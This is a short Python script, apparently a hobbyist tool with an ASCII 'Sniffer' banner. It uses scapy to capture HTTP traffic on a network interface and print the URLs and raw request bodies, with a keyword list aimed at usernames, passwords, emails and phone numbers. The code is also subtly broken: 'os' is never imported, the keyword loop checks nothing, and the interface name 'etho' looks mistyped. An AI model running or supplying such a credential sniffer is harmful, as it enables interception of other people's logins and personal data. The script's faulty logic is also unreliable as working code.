import scapy.all as scapy
from scapy.layers import http
import sys

red = '\033[91m'
blue = '\33[94m'
yellow = '\33[93m'
end = '\033[0m'

if len(sys.argv) < 2:
    os.system("cls || clear")
    sys.stdout.write(red+"""      


:'######::'##::: ##:'####:'########:'########:'########:'########::
'##... ##: ###:: ##:. ##:: ##.....:: ##.....:: ##.....:: ##.... ##:
 ##:::..:: ####: ##:: ##:: ##::::::: ##::::::: ##::::::: ##:::: ##:
. ######:: ## ## ##:: ##:: ######::: ######::: ######::: ########::
:..... ##: ##. ####:: ##:: ##...:::: ##...:::: ##...:::: ##.. ##:::
'##::: ##: ##:. ###:: ##:: ##::::::: ##::::::: ##::::::: ##::. ##::
. ######:: ##::. ##:'####: ##::::::: ##::::::: ########: ##:::. ##:
:......:::..::::..::....::..::::::::..::::::::........::..:::::..::
                                                                                 \n"""+end)

def sniff(interface):
    scapy.sniff(iface=interface, prn=process)

def process(packet):
    if packet.haslayer(http.HTTPRequest):
        url =packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["uid", "passw", "password", "username", "login","pass", "email", "phone number"]
            for keyword in keywords:
                print(load)
                break
sniff("etho")
